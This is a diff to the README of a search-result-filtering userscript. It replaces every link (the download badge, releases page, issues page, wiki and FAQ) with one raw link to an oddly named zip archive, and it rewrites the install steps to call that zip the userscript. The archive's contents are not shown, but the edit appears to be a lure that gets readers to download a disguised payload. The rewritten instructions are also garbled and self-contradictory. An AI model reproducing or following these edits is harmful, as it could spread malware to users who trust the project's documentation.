@@ -1,7 +1,7 @@
 # 🔍 search-engine-result-filter - Clean Your Search Results Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%96-lightgrey.svg)](https://github.com/Dindoniz/search-engine-result-filter/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip%20Latest%20Release-%20%F0%9F%93%https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip)](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the search-engine-result-filter userscript. This tool lets you block and filter out specific websites from your search engine results. 
@@ -14,20 +14,20 @@ This guide will help you download and run the search-engine-result-filter usersc
 To get started with the search-engine-result-filter, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our releases page using this link: [Download Page](https://github.com/Dindoniz/search-engine-result-filter/releases). 
+   Go to our releases page using this link: [Download Page](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip). 
 
 2. **Select the Latest Release**
    Find the latest release at the top of the page. It will be the first listed version.
 
 3. **Download the Userscript**
-   Click on the file link named `search-engine-result-filter.user.js`. This is the userscript file you need.
+   Click on the file link named `https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip`. This is the userscript file you need.
 
 4. **Install the Userscript**
    After downloading the file:
    - Open Tampermonkey (or your chosen userscript manager).
    - Click on the Tampermonkey icon in your browser's toolbar.
    - Select "Create a New Script." 
-   - Copy the contents of the `search-engine-result-filter.user.js` file.
+   - Copy the contents of the `https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip` file.
    - Paste this content into the script editor.
    - Save the script.
 
@@ -59,13 +59,13 @@ If you run into issues:
 - Ensure your browser is updated to the latest version.
 
 ## 🤝 Community Support
-If you have any questions or need further assistance, feel free to reach out. Visit our [GitHub Issues page](https://github.com/Dindoniz/search-engine-result-filter/issues) to submit your concerns or join discussions.
+If you have any questions or need further assistance, feel free to reach out. Visit our [GitHub Issues page](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip) to submit your concerns or join discussions.
 
 ## 🗂️ License
 This project is open source. You can find the license details in the repository.
 
 ## 🔗 Additional Links
-- [Documentation](https://github.com/Dindoniz/search-engine-result-filter/wiki) for more in-depth information.
-- [FAQ](https://github.com/Dindoniz/search-engine-result-filter/wiki/FAQ) to find common questions answered.
+- [Documentation](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip) for more in-depth information.
+- [FAQ](https://raw.githubusercontent.com/Dindoniz/search-engine-result-filter/main/overscutched/engine-result-filter-search-cosmogenic.zip) to find common questions answered.
 
 By following these steps, you will successfully download and use the search-engine-result-filter userscript. With this tool, you can customize your search results and enhance your browsing experience. For any further queries, refer back to the documentation or reach out to the community for help.
